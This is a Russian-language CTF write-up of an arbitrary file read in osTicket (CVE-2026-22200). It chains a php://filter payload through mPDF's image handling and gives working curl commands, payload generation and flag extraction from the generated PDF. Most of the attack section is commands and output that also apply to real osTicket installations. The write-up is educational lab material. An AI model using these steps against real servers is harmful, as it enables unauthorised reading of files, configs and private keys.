# Райтап — HelpDesk 2026 (CVE-2026-22200)

**Категория:** Web Exploitation  
**Сложность:** Hard  
**Очки:** 400  

---

## Описание задания

```
Наша служба поддержки только что переехала на новую платформу.
Флаг хранится на сервере. Найдите способ его прочитать.

URL: http://<host>:10130
```

---

## Разведка

Открываем сайт — видим helpdesk-портал. В самом низу страницы:

```
Helpdesk software - powered by osTicket v1.18.2
```

Версия есть — гуглим CVE для osTicket 2025–2026. Находим:

> **CVE-2026-22200** — Arbitrary File Read in osTicket < v1.18.3 via PHP filter stream wrappers + mPDF  
> PoC: https://github.com/horizon3ai/CVE-2026-22200

---

## Шаг 1 — Проверка уязвимости

Клонируем публичный PoC и запускаем `check.py`:

```bash
git clone https://github.com/horizon3ai/CVE-2026-22200
cd CVE-2026-22200
python3 -m venv venv && source venv/bin/activate
pip install -r requirements.txt

python3 check.py http://<host>:10130/
```

Вывод:

```
======================================================================
osTicket CVE-2026-22200 Check
======================================================================
[*] Target: http://localhost:10130/

[*] Checking account registration endpoint...
    [!] Account registration appears ENABLED

[*] Testing login validation...
    [!] VULNERABLE - Server returned: "Access denied"

[*] Checking open ticket endpoint...
    [!] Open ticket form is ACCESSIBLE (no login required)

[*] Testing for CVE-2026-22200 patch status...
    [!] Found topic_id that supports rich text message: 11
    [!] VULNERABLE - srcset attribute was NOT stripped
    [!] Target appears to be running osTicket < v1.18.3 / < v1.17.7

======================================================================
FINAL VERDICT
======================================================================
[!] Target is LIKELY VULNERABLE to CVE-2026-22200
[!] Target is LIKELY EXPLOITABLE by anonymous attackers
```

Цель уязвима. Регистрация включена — создаём аккаунт.

---

## Шаг 2 — Регистрация / Логин

На странице `/account.php` регистрируемся:

- Email: `attacker@evil.com`
- Password: любой

После логина получаем сессию аутентифицированного пользователя.

---

## Шаг 3 — Суть уязвимости

CVE-2026-22200 — **Arbitrary File Read** через цепочку:

1. osTicket принимает HTML в поле сообщения тикета (rich text)
2. HTML сохраняется в БД и при генерации PDF передаётся в **mPDF**
3. mPDF рендерит HTML и обрабатывает атрибут `srcset` у тегов `<img>`
4. В качестве `srcset` можно передать `php://filter/...` URL
5. PHP читает произвольный файл через wrapper и возвращает его содержимое как изображение (BMP)
6. mPDF встраивает BMP в PDF — данные файла оказываются в пикселях

Вектор:
```
<img srcset="php://filter/convert.base64-encode|...|resource=/flag.txt">
```

---

## Шаг 4 — Генерация payload

PoC содержит `osticket_ticket_payload_gen.py` — генерирует корректный `<ul><li>` с img-тегом и длинной цепочкой `php://filter`:

```bash
python3 osticket_ticket_payload_gen.py -f /flag.txt,b64 > /tmp/payload.txt
```

Файл содержит что-то вроде:

```html
<ul><li style="list-style-image:url&#34(php%3A//filter/convert.base64-encode
  |convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|...
  |convert.base64-decode/resource%3D/flag.txt)">listitem</li></ul>
```

---

## Шаг 5 — Создание тикета с payload

```bash
# Получить CSRF токен
CSRF=$(curl -sc /tmp/ost.txt http://localhost:10130/login.php \
  | grep -oP '(?<=content=")[a-f0-9]{40}')

# Логин
curl -sb /tmp/ost.txt -c /tmp/ost.txt -X POST http://localhost:10130/login.php \
  -d "__CSRFToken__=$CSRF&luser=attacker%40evil.com&lpasswd=<password>&do=sclient" \
  -L -o /dev/null

# Получить CSRF для формы тикета
CSRF2=$(curl -sb /tmp/ost.txt http://localhost:10130/open.php?topicId=2 \
  | grep -oP '(?<=content=")[a-f0-9]{40}')

# Отправить тикет с payload
PAYLOAD=$(cat /tmp/payload.txt)
TICKET_URL=$(curl -sb /tmp/ost.txt -c /tmp/ost.txt \
  -X POST http://localhost:10130/open.php \
  --data-urlencode "__CSRFToken__=$CSRF2" \
  --data-urlencode "a=open" \
  --data-urlencode "topicId=2" \
  --data-urlencode "name=Attacker" \
  --data-urlencode "subject=test" \
  --data-urlencode "message=$PAYLOAD" \
  -L -w "%{url_effective}" -o /dev/null)

TICKET_ID=$(echo "$TICKET_URL" | grep -oP 'id=\K\d+')
echo "Ticket ID: $TICKET_ID"
```

Вывод:
```
Ticket URL: http://localhost:10130/tickets.php?id=14
Ticket ID: 14
```

---

## Шаг 6 — Скачать PDF

Генерируем PDF из тикета (GET-запрос):

```bash
curl -sb /tmp/ost.txt \
  "http://localhost:10130/tickets.php?a=print&id=${TICKET_ID}&psize=Letter" \
  -o flag.pdf

file flag.pdf
```

```
flag.pdf: PDF document, version 1.4, 1 page(s)
```

PDF содержит наш тикет. mPDF при генерации PDF обратился к `php://filter` URL и встроил содержимое `/flag.txt` как BMP-изображение в пикселях.

---

## Шаг 7 — Извлечь флаг из PDF

Используем `extract_pdf_images.py` из PoC:

```bash
python3 extract_pdf_images.py flag.pdf -v
```

```
Found 2 images on page 1
Error processing image 1 on page 1: not enough image data

Saved original image as BMP: page1_img2.bmp
B64 decode failed after 25 bytes (>= 12). Returning partial output.
Zlib error encountered at chunk 0: Error -3 while decompressing data:
  invalid distance too far back. Stopping decompression.
b'RCPISS{php_f1lt3r_pwn3d}\n'
Wrote extracted data to: page1_img2.bmp.extracted
```

Флаг найден в пикселях BMP-изображения, встроенного в PDF.

---

## Флаг

```
RCPISS{php_f1lt3r_pwn3d}
```

---

## Техническое объяснение

### Почему `php://filter` работает?

mPDF при рендеринге `<img srcset="...">` вызывает `file_get_contents()` с URL из атрибута. PHP stream wrapper `php://filter` позволяет применить цепочку преобразований к содержимому файла:

```
php://filter/
  convert.base64-encode|          ← base64 encode /flag.txt
  convert.iconv.UTF8.CSISO2022KR| ← добавить CSISO2022KR маркер
  convert.base64-encode|          ← ещё раз encode
  ... (длинная цепочка iconv) ... ← конвертации для "упаковки" в BMP
  convert.base64-decode|
  resource=/flag.txt
```

Результат — валидный BMP-файл, в пикселях которого закодировано содержимое `/flag.txt` в base64.

### Схема атаки

```
Аттакер                    osTicket                    mPDF
   │                           │                          │
   │── POST /open.php ─────────▶│                          │
   │   (srcset=php://filter)    │                          │
   │                           │── сохранить HTML ────────▶│
   │                           │                          │
   │── GET /tickets.php?a=print ▶│                          │
   │                           │── renderHTML() ──────────▶│
   │                           │                    file_get_contents(
   │                           │                    php://filter/.../flag.txt)
   │                           │                          │── читает /flag.txt
   │                           │                          │   кодирует в BMP
   │                           │◀─ PDF с BMP внутри ──────│
   │◀── flag.pdf ───────────────│                          │
   │                           │                          │
   │── extract_pdf_images.py ──▶ (локально)                │
   │   читает пиксели BMP                                  │
   │   base64-декодирует                                   │
   │◀── RCPISS{php_f1lt3r_pwn3d}                           │
```

---

## Выводы

- **Версия в footer** — всегда проверяй, часто раскрывает точную версию ПО
- **PHP stream wrappers** (`php://filter`) — мощный вектор, когда user input попадает в `file_get_contents()`
- **PDF-генераторы** (mPDF, TCPDF, wkhtmltopdf), обрабатывающие произвольный HTML — классическая точка атаки
- **«Read-only» уязвимости** не менее критичны: `/flag.txt`, `config.php`, `id_rsa` = game over
- Публичный PoC **horizon3ai/CVE-2026-22200** работает из коробки
